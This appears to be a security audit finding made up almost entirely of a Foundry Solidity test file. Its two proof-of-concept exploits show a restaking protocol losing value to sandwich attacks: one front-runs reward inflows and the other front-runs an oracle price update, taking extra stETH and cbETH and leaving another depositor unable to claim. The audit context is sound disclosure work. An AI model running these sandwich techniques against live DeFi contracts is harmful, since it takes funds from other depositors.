### Coded PoCs

The following test file contain two PoCs. `test_PoC_1_RewardsTVLInflation()` demonstrates the rewards sandwich attack, and `testFail_PoC_2_OracleUpdateSandwich()` demonstrates the oracle sandwich attack.

The PoC file can be run in Foundry by using the setup and mock infra provided here -> https://gist.github.com/3docSec/a4bc6254f709a6218907a3de370ae84e

<details>
<summary>PoC file</summary>
<br>

```solidity
pragma solidity ^0.8.19;

import "contracts/Errors/Errors.sol";
import "./Setup.sol";
import "forge-std/console.sol";

contract MR2 is Setup {

    address public alice = address(0x8fc0684616437378809443D09a9f423ebc0c3762);
    address public bob = address(0xCCf0B9913A33D0bF15063EBA7EBEC94cb8D25baa);
    address public adam = address(0x1F5debE8b6a660BDA658Fc8A558AD9901D27C897);
    address payable public jack = payable(address(0x5AdE3D5c4B61F0D569d364eadb44E4983CbAe679));
    address public attacker = address(0xF77d0da2220966eb570385dF43732D9e0ff2974B);


    function configureBalancesAndApprovals() public {

        stETH.mint(alice, 100e18);
        stETH.mint(bob, 100e18);
        cbETH.mint(jack, 100e18);
        cbETH.mint(adam, 50e18);

        // ---- Required restakeManager approvals ----
        vm.startPrank(alice);
        stETH.approve(address(restakeManager), 100e18);

        vm.startPrank(bob);
        stETH.approve(address(restakeManager), 100e18);

        vm.startPrank(jack);
        cbETH.approve(address(restakeManager), 100e18);

        vm.startPrank(adam);
        cbETH.approve(address(restakeManager), 50e18);

    }

    function configureWithdrawBuffersAndOracles() public {

        // --------- INITIAL CONFIGURATION ---------

        // We set the buffer to something reasonably high.
        WithdrawQueueStorageV1.TokenWithdrawBuffer[] memory buffers = new WithdrawQueueStorageV1.TokenWithdrawBuffer[](2);

        buffers[0] = 
            WithdrawQueueStorageV1.TokenWithdrawBuffer(
                address(stETH),
                400e18// bufferAmount
            );

        buffers[1] = 
            WithdrawQueueStorageV1.TokenWithdrawBuffer(
                address(cbETH),
                400e18// bufferAmount
            );

        vm.startPrank(OWNER);
        withdrawQueue.updateWithdrawBufferTarget(buffers);

        // we'll be using stETH & cbETH.
        stEthPriceOracle.setAnswer(1e18);
        cbEthPriceOracle.setAnswer(1e18);

    }


    function test_PoC_1_RewardsTVLInflation() public {

        configureWithdrawBuffersAndOracles();

        // confirmation we are starting with 0 TVL
        (, , uint tvl) = restakeManager.calculateTVLs();
        assertEq(0, tvl);


        // Alice deposits a total of 1000 stETH, so now the total TVL will be 1000 stETH
        vm.startPrank(alice);
        stETH.mint(alice, 1000e18);
        stETH.approve(address(restakeManager), 1000e18);
        restakeManager.deposit(IERC20(address(stETH)), 1000e18);
        vm.stopPrank();

        (, , tvl) = restakeManager.calculateTVLs();
        assertEq(1000e18, tvl); // We now have a total TVL of 1,000e18

        // ------------- Rewards sandwich attack -------------

        // Attacker front-runs the rewards going in the application, and deposits a 100 stETH
        vm.startPrank(attacker);
        stETH.mint(attacker, 100e18);
        stETH.approve(address(restakeManager), 100e18);
        restakeManager.deposit(IERC20(address(stETH)), 100e18);
        vm.stopPrank();

        (, , tvl) = restakeManager.calculateTVLs();
        assertEq(1100e18, tvl); // We now have a total TVL of 1,100e18

        // 100 ETH rewards flow into the protocol
        address(depositQueue).call{value: 100 ether}("");

        (, , tvl) = restakeManager.calculateTVLs();
        assertEq(1200e18, tvl); // We now have a total TVL of 1,200e18


        // Attacker completes the sandwich by requesting a withdrawal, waiting, then claiming.

        vm.startPrank(attacker);

        ezETH.approve(address(withdrawQueue), ezETH.balanceOf(attacker));
        withdrawQueue.withdraw(ezETH.balanceOf(attacker), address(stETH));

        vm.warp(block.timestamp + 10 days);

        withdrawQueue.claim(0);

        // Attacker after claiming now has a balance of 109 stETH, so he made over 9 stETH in profit!
        assertGt(stETH.balanceOf(attacker), 109e18);

    }


    function testFail_PoC_2_OracleUpdateSandwich() public {

        configureWithdrawBuffersAndOracles();

        // confirmation we are starting with 0 TVL
        (, , uint tvl) = restakeManager.calculateTVLs();
        assertEq(0, tvl);

        // Mint alice & bob stETH and approve the restakeManager to spend them
        configureBalancesAndApprovals();

        vm.startPrank(bob);
        restakeManager.deposit(IERC20(address(stETH)), 100e18);
        vm.stopPrank();

        vm.startPrank(alice);
        restakeManager.deposit(IERC20(address(stETH)), 100e18);
        vm.stopPrank();

        vm.startPrank(adam);
        restakeManager.deposit(IERC20(address(cbETH)), 10e18);
        vm.stopPrank();


        // --------- Exploit ---------

        // jack (attacker) front-runs oracle update with a 100 cbETH deposit
        vm.startPrank(jack);
        restakeManager.deposit(IERC20(address(cbETH)), 100e18);
        vm.stopPrank();

        // stETH price increases by 10%
        stEthPriceOracle.setAnswer(1e18+1.0e17);

        // -------- Attacker requests a withdrawal and claims his cbETH funds --------

        // Jack (attacker) walks away with extra 6.45 cbETH
        vm.startPrank(jack);
        ezETH.approve(address(withdrawQueue), ezETH.balanceOf(jack));
        withdrawQueue.withdraw(ezETH.balanceOf(jack), address(cbETH));
        vm.stopPrank();

        // Skip withdrawal wait window
        vm.warp(block.timestamp + 10 days);

        vm.startPrank(jack);
        withdrawQueue.claim(0); // Jack will claim 106.45 cbETH instead of the 100 cbETH he should've gotten!
        vm.stopPrank();

        // Jack now has 106.45 more cbETH on top of his initially deposited 100 cbETH
        uint256 jacksCurrentCbETHBalance = cbETH.balanceOf(jack);
        assertGt(jacksCurrentCbETHBalance, 100e18 + 4.45e18);


        // -------- Adam trying to withdraw & claim his cbETH funds --------

        vm.startPrank(adam);

        ezETH.approve(address(withdrawQueue), ezETH.balanceOf(adam));
        withdrawQueue.withdraw(ezETH.balanceOf(adam), address(cbETH));

        // Skip withdrawal wait window
        vm.warp(block.timestamp + 10 days);

        // This call will fail because the protocol won't have enough funds to pay adam his share of cbETH
        withdrawQueue.claim(0);

    }

}
```
